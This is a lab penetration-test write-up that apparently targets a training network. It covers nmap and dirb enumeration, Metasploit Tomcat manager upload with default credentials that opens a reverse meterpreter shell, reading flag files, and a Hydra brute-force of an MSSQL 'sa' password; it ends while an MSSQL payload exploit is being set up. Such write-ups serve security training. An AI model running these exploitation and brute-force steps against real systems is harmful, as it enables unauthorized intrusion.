Black Box Pentest 1

# Enumeration

## Network
```
┌──(kali㉿kali)-[~]
└─$ fping -a -g 172.16.64.0/24 2>/dev/null                                                                                                                          1 ⨯
172.16.64.10
172.16.64.101
172.16.64.140
172.16.64.182
172.16.64.199
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ nmap -sn 172.16.64.10/24                                                                                                                                        1 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-20 22:54 EDT
Nmap scan report for 172.16.64.10
Host is up (0.000064s latency).
Nmap done: 256 IP addresses (1 host up) scanned in 2.75 seconds
                                                               └─$ nmap -sT 172.16.64.101 172.16.64.140 172.16.64.182 172.16.64.199 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-20 22:57 EDT
Stats: 0:00:01 elapsed; 0 hosts completed (4 up), 4 undergoing Connect Scan
Connect Scan Timing: About 4.76% done; ETC: 22:58 (0:00:40 remaining)
Stats: 0:00:29 elapsed; 0 hosts completed (4 up), 4 undergoing Connect Scan
Connect Scan Timing: About 17.40% done; ETC: 23:00 (0:02:22 remaining)
Stats: 0:01:02 elapsed; 0 hosts completed (4 up), 4 undergoing Connect Scan
Connect Scan Timing: About 31.91% done; ETC: 23:01 (0:02:14 remaining)
Nmap scan report for 172.16.64.101
Host is up (0.25s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
9080/tcp open  glrpc

Nmap scan report for 172.16.64.140
Host is up (0.25s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 172.16.64.182
Host is up (0.25s latency).
Not shown: 998 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
10010/tcp filtered rxapi

Nmap scan report for 172.16.64.199
Host is up (0.25s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s

Nmap done: 4 IP addresses (4 hosts up) scanned in 214.19 seconds
┌──(kali㉿kali)-[~]
└─$ nmap -sV 172.16.64.101 172.16.64.140 172.16.64.182 172.16.64.199 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-20 22:55 EDT
Stats: 0:03:10 elapsed; 0 hosts completed (4 up), 4 undergoing Connect Scan
Connect Scan Timing: About 77.92% done; ETC: 22:59 (0:00:54 remaining)
Stats: 0:11:37 elapsed; 0 hosts completed (4 up), 4 undergoing Connect Scan
Connect Scan Timing: About 99.49% done; ETC: 23:07 (0:00:04 remaining)
Nmap scan report for 172.16.64.101
Host is up (0.26s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
9080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 172.16.64.140
Host is up (0.26s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Nmap scan report for 172.16.64.182
Host is up (0.25s latency).
Not shown: 998 closed ports
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
16080/tcp filtered osxwebadmin
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 172.16.64.199
Host is up (0.25s latency).
Not shown: 995 closed ports
PORT      STATE    SERVICE       VERSION
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2014 12.00.2000
12265/tcp filtered unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (4 hosts up) scanned in 764.95 seconds

```

12min

Services Googling

Service | Any Exploits
-|-
OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | -
Apache Tomcat/Coyote JSP engine 1.1 | -
Apache httpd 2.4.18 | -
Microsoft Windows RPC | -
 Microsoft Windows netbios-ssn | -
Microsoft SQL Server 2014 12.00.2000 | -

## Individual

### Server 1 `172.16.64.101`

```
Nmap scan report for 172.16.64.101
Host is up (0.26s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
9080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Web Server
```
┌──(kali㉿kali)-[~]
└─$ dirb http://172.16.64.101:8080/ /usr/share/wordlists/dirb/common.txt                                                                                          130 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Aug 22 00:09:43 2021
URL_BASE: http://172.16.64.101:8080/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.16.64.101:8080/ ----
+ http://172.16.64.101:8080/host-manager (CODE:302|SIZE:0)                                                                                                             
+ http://172.16.64.101:8080/index.html (CODE:200|SIZE:11321)                                                                                                           
+ http://172.16.64.101:8080/manager (CODE:302|SIZE:0)                                                                                                                  
                                                                                                                                                                       
-----------------
END_TIME: Sun Aug 22 00:43:04 2021
DOWNLOADED: 4612 - FOUND: 3

```

Likely same for port 8080 and 9080
![969dd712b8bec15990a1d6a84e6c2fc0.png](../../_resources/8434bf13d0af43cbbf9a0bc25bbc3539.png)
![b365af2b23647552cba0bd5f114bcd4b.png](../../_resources/b717c17f8c364230aa7195f7d42f2b5b.png)
![f2e64e7043bb83ffdd0d8bf0ed19eb91.png](../../_resources/0eeb47dcb0aa4356a416501b3e83a758.png)
![4b1e114d28fe0de05e92866cf1191741.png](../../_resources/44d009c2e736458c9443567de2edd087.png)

Using the default credentials `tomcat`:`s3cret`:
![841061f5cdb0fb213df929c0cc8f45ae.png](../../_resources/ea23153125f443fa90cde78f510f41e4.png)
![eb096d89b698f419297a73c4aebd3043.png](../../_resources/09f1e8c9d9ec485d8e42be93814a7faf.png)

https://arkanoidctf.medium.com/hackthebox-writeup-jerry-aa2b992917a7
https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell/

Following tutorial
```
msf6 > use exploit/multi/http/tomcat_mgr_upload 
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword tomcat
HttpPassword => tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
HttpUsername => tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword s3cret
HttpPassword => s3cret
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 172.16.64.101
RHOSTS => 172.16.64.101
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT9080
[-] Unknown variable
Usage: set [option] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 9080
RPORT => 9080
msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST 172.16.64.10
LHOST => 172.16.64.10
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit

[-] Handler failed to bind to 172.16.64.10:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying zW0BIm1BtIhnmDP...
[*] Executing zW0BIm1BtIhnmDP...
[*] Undeploying zW0BIm1BtIhnmDP ...
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080
RPORT => 8080
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit

[-] Handler failed to bind to 172.16.64.10:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying imkSx6d0BMfedVE1QKk2Ornwl1UZl3...
[*] Executing imkSx6d0BMfedVE1QKk2Ornwl1UZl3...
[*] Undeploying imkSx6d0BMfedVE1QKk2Ornwl1UZl3 ...
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  s3cret           no        The password for the specified username
   HttpUsername  tomcat           no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        172.16.64.101    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         8080             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.16.64.10     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST 172.16.64.11
LHOST => 172.16.64.11
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit

[-] Handler failed to bind to 172.16.64.11:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying xQwt...
[*] Executing xQwt...
[*] Undeploying xQwt ...
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.0.2.15
LHOST => 10.0.2.15
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 10.0.2.15:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying SIUr5onCwy9reP...
[*] Executing SIUr5onCwy9reP...
[*] Undeploying SIUr5onCwy9reP ...
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST 172.16.64.12
LHOST => 172.16.64.12
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 172.16.64.12:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying cZlpRUgcFSMJ3...
[*] Executing cZlpRUgcFSMJ3...
[*] Sending stage (58125 bytes) to 172.16.64.101
[*] Meterpreter session 1 opened (172.16.64.12:4444 -> 172.16.64.101:58412) at 2021-08-22 02:14:21 -0400
[*] Undeploying cZlpRUgcFSMJ3 ...
```

#### Further Enumeration

```
meterpreter > ls
Listing: /var/lib/tomcat8
=========================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40554/r-xr-xr--  4096  dir   2020-03-27 04:07:26 -0400  conf
40776/rwxrwxrw-  4096  dir   2020-01-24 14:34:13 -0500  lib
40776/rwxrwxrw-  4096  dir   2021-08-22 00:05:25 -0400  logs
40776/rwxrwxrw-  4096  dir   2021-08-22 02:40:21 -0400  webapps
40776/rwxrwxrw-  4096  dir   2020-03-27 03:24:22 -0400  work

meterpreter > shell
Process 1 created.
Channel 1 created.
ls -R
.:
conf
lib
logs
webapps
work

./lib:

./webapps:
8dXf1bsv
8dXf1bsv.war
cZlpRUgcFSMJ3
cZlpRUgcFSMJ3.war
imkSx6d0BMfedVE1QKk2Ornwl1UZl3
imkSx6d0BMfedVE1QKk2Ornwl1UZl3.war
ROOT
SIUr5onCwy9reP
SIUr5onCwy9reP.war
xQwt
xQwt.war
zW0BIm1BtIhnmDP
zW0BIm1BtIhnmDP.war

./webapps/8dXf1bsv:
META-INF
WEB-INF

./webapps/8dXf1bsv/META-INF:
war-tracker

./webapps/8dXf1bsv/WEB-INF:
classes
web.xml

./webapps/8dXf1bsv/WEB-INF/classes:
metasploit
metasploit.dat

./webapps/8dXf1bsv/WEB-INF/classes/metasploit:
Payload.class
PayloadServlet.class

./webapps/cZlpRUgcFSMJ3:
META-INF
WEB-INF

./webapps/cZlpRUgcFSMJ3/META-INF:
war-tracker

./webapps/cZlpRUgcFSMJ3/WEB-INF:
classes
web.xml

./webapps/cZlpRUgcFSMJ3/WEB-INF/classes:
metasploit
metasploit.dat

./webapps/cZlpRUgcFSMJ3/WEB-INF/classes/metasploit:
Payload.class
PayloadServlet.class

./webapps/imkSx6d0BMfedVE1QKk2Ornwl1UZl3:
META-INF
WEB-INF

./webapps/imkSx6d0BMfedVE1QKk2Ornwl1UZl3/META-INF:
war-tracker

./webapps/imkSx6d0BMfedVE1QKk2Ornwl1UZl3/WEB-INF:
classes
web.xml

./webapps/imkSx6d0BMfedVE1QKk2Ornwl1UZl3/WEB-INF/classes:
metasploit
metasploit.dat

./webapps/imkSx6d0BMfedVE1QKk2Ornwl1UZl3/WEB-INF/classes/metasploit:
Payload.class
PayloadServlet.class

./webapps/ROOT:
index.html
META-INF

./webapps/ROOT/META-INF:
context.xml

./webapps/SIUr5onCwy9reP:
META-INF
WEB-INF

./webapps/SIUr5onCwy9reP/META-INF:
war-tracker

./webapps/SIUr5onCwy9reP/WEB-INF:
classes
web.xml

./webapps/SIUr5onCwy9reP/WEB-INF/classes:
metasploit
metasploit.dat

./webapps/SIUr5onCwy9reP/WEB-INF/classes/metasploit:
Payload.class
PayloadServlet.class

./webapps/xQwt:
META-INF
WEB-INF

./webapps/xQwt/META-INF:
war-tracker

./webapps/xQwt/WEB-INF:
classes
web.xml

./webapps/xQwt/WEB-INF/classes:
metasploit
metasploit.dat

./webapps/xQwt/WEB-INF/classes/metasploit:
Payload.class
PayloadServlet.class

./webapps/zW0BIm1BtIhnmDP:
META-INF
WEB-INF

./webapps/zW0BIm1BtIhnmDP/META-INF:
war-tracker

./webapps/zW0BIm1BtIhnmDP/WEB-INF:
classes
web.xml

./webapps/zW0BIm1BtIhnmDP/WEB-INF/classes:
metasploit
metasploit.dat

./webapps/zW0BIm1BtIhnmDP/WEB-INF/classes/metasploit:
Payload.class
PayloadServlet.class
cat ./webapps/ROOT/META-INF/content.xml
cat: ./webapps/ROOT/META-INF/content.xml: No such file or directory
cd ./webapps/ROOT/META-INF
ls
context.xml
cat context.xml
<Context path=""
        antiResourceLocking="false" />
cd -
/var/lib/tomcat8
cat ./webapps/zW0BIm1BtIhnmDP/WEB-INF/classes/metasploit.dat
Spawn=2
LHOST=172.16.64.10
LPORT=4444
exit
meterpreter > 

```

```
meterpreter > sysinfo
Computer    : xubuntu
OS          : Linux 4.4.0-104-generic (amd64)
Meterpreter : java/linux
meterpreter > ls
Listing: /var/lib/tomcat8
=========================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40554/r-xr-xr--  4096  dir   2020-03-27 04:07:26 -0400  conf
40776/rwxrwxrw-  4096  dir   2020-01-24 14:34:13 -0500  lib
40776/rwxrwxrw-  4096  dir   2021-08-22 00:05:25 -0400  logs
40776/rwxrwxrw-  4096  dir   2021-08-22 02:23:34 -0400  webapps
40776/rwxrwxrw-  4096  dir   2020-03-27 03:24:22 -0400  work
meterpreter > cd /home
meterpreter > shell
Process 4 created.
Channel 4 created.
ls -R
.:
adminels
developer
elsuser

./adminels:
Desktop

./adminels/Desktop:
flag.txt

./developer:
flag.txt

./elsuser:
Desktop
Documents
Downloads
index.html
Music
Pictures
Public
Templates
Videos

./elsuser/Desktop:

./elsuser/Documents:

./elsuser/Downloads:

./elsuser/Music:

./elsuser/Pictures:

./elsuser/Public:

./elsuser/Templates:

./elsuser/Videos:
cat ./adminels/Desktop/flag.txt
You did it!
cat ./developer/flag.txt
Congratulations, you got it!
exit
meterpreter >
meterpreter > cd /
meterpreter > search -f flag.txt
Found 2 results...
    /home/adminels/Desktop/flag.txt (12 bytes)
    /home/developer/flag.txt (29 bytes)
meterpreter > 

```


### Server 2 `172.16.64.140`

```
Nmap scan report for 172.16.64.140
Host is up (0.26s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
┌──(kali㉿kali)-[~]
└─$ sudo  nmap -Pn -T4 --open -sS -sC -sV --min-rate=1000 --max-retries=3 -p- -oN scanReportForHost2 172.16.64.140                                                  1 ⨯

[sudo] password for kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-22 03:06 EDT
Nmap scan report for 172.16.64.140
Host is up (0.24s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 404 HTML Template by Colorlib
MAC Address: 00:50:56:A5:51:09 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.79 seconds

```

#### Web Server

```
└─$ dirb http://172.16.64.140/ /usr/share/wordlists/dirb/common.txt                                                                                               130 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Aug 22 00:09:51 2021
URL_BASE: http://172.16.64.140/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.16.64.140/ ----
==> DIRECTORY: http://172.16.64.140/css/                                                                                                                               
==> DIRECTORY: http://172.16.64.140/img/                                                                                                                               
+ http://172.16.64.140/index.html (CODE:200|SIZE:1487)                                                                                                                 
+ http://172.16.64.140/project (CODE:401|SIZE:460)                                                                                                                     
+ http://172.16.64.140/server-status (CODE:403|SIZE:301)                                                                                                               
^[[C                                                                                                                                                                                                                                                                                                                                           
---- Entering directory: http://172.16.64.140/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                       
---- Entering directory: http://172.16.64.140/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sun Aug 22 00:41:25 2021
DOWNLOADED: 4612 - FOUND: 3
┌──(kali㉿kali)-[/media/sf_tmp]
└─$ dirb http://172.16.64.140/project /usr/share/wordlists/dirb/common.txt -u admin:admin                                                                         255 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Aug 22 03:17:49 2021
URL_BASE: http://172.16.64.140/project/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
AUTHORIZATION: admin:admin

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.16.64.140/project/ ----
==> DIRECTORY: http://172.16.64.140/project/backup/                                                                                                                    
==> DIRECTORY: http://172.16.64.140/project/css/                                                                                                                       
==> DIRECTORY: http://172.16.64.140/project/images/                                                                                                                    
+ http://172.16.64.140/project/includes (CODE:403|SIZE:304)                                                                                                            
+ http://172.16.64.140/project/index.html (CODE:200|SIZE:6525)                                                                                                         
^C> Testing: http://172.16.64.140/project/menus                                                                                                                        
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/sf_tmp]
└─$ dirb http://172.16.64.140/project/backup /usr/share/wordlists/dirb/common.txt -u admin:admin                                                                  130 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Aug 22 03:28:16 2021
URL_BASE: http://172.16.64.140/project/backup/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
AUTHORIZATION: admin:admin

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.16.64.140/project/backup/ ----
^C> Testing: http://172.16.64.140/project/backup/~adm                                                                                                                  
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/sf_tmp]
└─$ dirb http://172.16.64.140/project/backup /usr/share/wordlists/dirb/common.txt -u admin:admin                                                                  130 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Aug 22 03:29:02 2021
URL_BASE: http://172.16.64.140/project/backup/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
AUTHORIZATION: admin:admin

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.16.64.140/project/backup/ ----
==> DIRECTORY: http://172.16.64.140/project/backup/backup/                                                                                                             
==> DIRECTORY: http://172.16.64.140/project/backup/css/                                                                                                                
==> DIRECTORY: http://172.16.64.140/project/backup/images/                                                                                                             
+ http://172.16.64.140/project/backup/index.html (CODE:200|SIZE:6525)                                                                                                  
==> DIRECTORY: http://172.16.64.140/project/backup/test/                                                                                                               
                                                                                                                                                                       
---- Entering directory: http://172.16.64.140/project/backup/backup/ ----
+ http://172.16.64.140/project/backup/backup/index.html (CODE:200|SIZE:6525)                                                                                           
^C> Testing: http://172.16.64.140/project/backup/backup/releases                       
└─$ dirb http://172.16.64.140/project/backup/backup /usr/share/wordlists/dirb/common.txt -u admin:admin                                                           130 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Aug 22 04:04:13 2021
URL_BASE: http://172.16.64.140/project/backup/backup/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
AUTHORIZATION: admin:admin

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.16.64.140/project/backup/backup/ ----
+ http://172.16.64.140/project/backup/backup/index.html (CODE:200|SIZE:6525)                                                                                           
                                                                                                                                                                       
-----------------
END_TIME: Sun Aug 22 04:23:45 2021
DOWNLOADED: 4612 - FOUND: 1

```
![b8f169934e12e34e1f93aa17fca36e5e.png](../../_resources/d5aa1e561f744a05a4a16ccc5e37aa5c.png)
![b6e1f6f0ac5308180c2d7eef26e05a20.png](../../_resources/9278374361b040eea6f16cd90e04b939.png)
![baa28584e0b67ab884e73d3af98111e4.png](../../_resources/8d9e7d8dd2db4d9ab225c112c1e9f67b.png)
![52658d6e4e70d39c7703a666b18ef201.png](../../_resources/67df240322524d0480902a90fb3f85a2.png)
![6e62a9d0dd33b46d3ba15073eb60997e.png](../../_resources/60b1f13a1c7d4a1aa3e1ac268983416a.png)

#### Project

![1d6b05ae2d1b4bee29b16348727597c1.png](../../_resources/e2d19cced9494dbdb9b79d4e1449dffa.png)

![3fe4f685e718307c7ea0d7144373b93a.png](../../_resources/2b49dd1728ab42f18bb9b9e88c466412.png)

Username: admin, password: admin (guess with inference, you can't put other password. If you don't put username as admin, they will prompt for admin)

![2cae875e84a38f76a0785f64bf6978d7.png](../../_resources/f371de6148c340c3941cf2f46f6a620c.png)

All text boxes are useless

Template from https://freewebsitetemplates.com/
![23fb0e54bea1ed8b95c745aa5d25cba1.png](../../_resources/f9705706d6db4a0686d6e5a5488e19f3.png)
![fd8fb15ebe9df55f1e7c1c089de4627c.png](../../_resources/72a551a1e5104e3f9d140e8733117513.png)



![bc0f668a5dbb9af7793e9cb0762e6405.png](../../_resources/85f87eeaf9e2414490167b32106323b3.png)
### Server 3 `172.16.64.182`

```
Nmap scan report for 172.16.64.182
Host is up (0.25s latency).
Not shown: 998 closed ports
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
16080/tcp filtered osxwebadmin
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Server 4 `172.16.64.199`

```
Nmap scan report for 172.16.64.199
Host is up (0.25s latency).
Not shown: 995 closed ports
PORT      STATE    SERVICE       VERSION
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2014 12.00.2000
12265/tcp filtered unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```
┌──(kali㉿kali)-[~]
└─$ enum4linux -A 172.16.64.199 
Unknown option: A
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Aug 20 23:03:31 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 172.16.64.199
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 172.16.64.199    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================= 
|    Nbtstat Information for 172.16.64.199    |
 ============================================= 
Looking up status of 172.16.64.199
        WIN10           <20> -         B <ACTIVE>  File Server Service
        WIN10           <00> -         B <ACTIVE>  Workstation Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name

        MAC Address = 00-50-56-A5-04-8E

 ====================================== 
|    Session Check on 172.16.64.199    |
 ====================================== 
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.

└─$ nmblookup -A 172.16.64.199                                                                                                                                    100 ⨯
Looking up status of 172.16.64.199
        WIN10           <20> -         B <ACTIVE> 
        WIN10           <00> -         B <ACTIVE> 
        WORKGROUP       <00> - <GROUP> B <ACTIVE> 

        MAC Address = 00-50-56-A5-04-8E
```

```
┌──(kali㉿kali)-[~]
└─$ hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/wordlists/rockyou.txt 172.16.64.199 mssql 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-22 05:04:38
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 473365167 login tries (l:33/p:14344399), ~29585323 tries per task
[DATA] attacking mssql://172.16.64.199:1433/
[STATUS] 1061.00 tries/min, 1061 tries in 00:01h, 473364106 to do in 7435:50h, 16 active
[STATUS] 1083.33 tries/min, 3250 tries in 00:03h, 473361917 to do in 7282:30h, 16 active
[STATUS] 1108.71 tries/min, 7761 tries in 00:07h, 473357406 to do in 7115:43h, 16 active
e[STATUS] 1123.87 tries/min, 16858 tries in 00:15h, 473348309 to do in 7019:39h, 16 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ hydra -l sa -P /usr/share/wordlists/rockyou.txt 172.16.64.199 mssql
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-22 05:33:37
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking mssql://172.16.64.199:1433/
[1433][mssql] host: 172.16.64.199   login: sa   password: qwerty
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-22 05:33:51
```


https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
```
msf6 auxiliary(scanner/mssql/mssql_ping) > use exploit/windows/mssql/mssql_payload
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/mssql/mssql_payload) > show options

Module options (exploit/windows/mssql/mssql_payload):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   METHOD               cmd              yes       Which payload delivery method to use (ps, cmd, or old)
   PASSWORD                              no        The password for the specified username
   RHOSTS               172.16.64.199    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                1433             yes       The target port (TCP)
   SRVHOST              0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT              8080             yes       The local port to listen on.
   SSL                  false            no        Negotiate SSL for incoming connections
   SSLCert                               no        Path to a custom SSL certificate (default is randomly generated)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   URIPATH                               no        The URI to use for this exploit (default is random)
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.64.10     yes       The listen address (an interface may be specified)
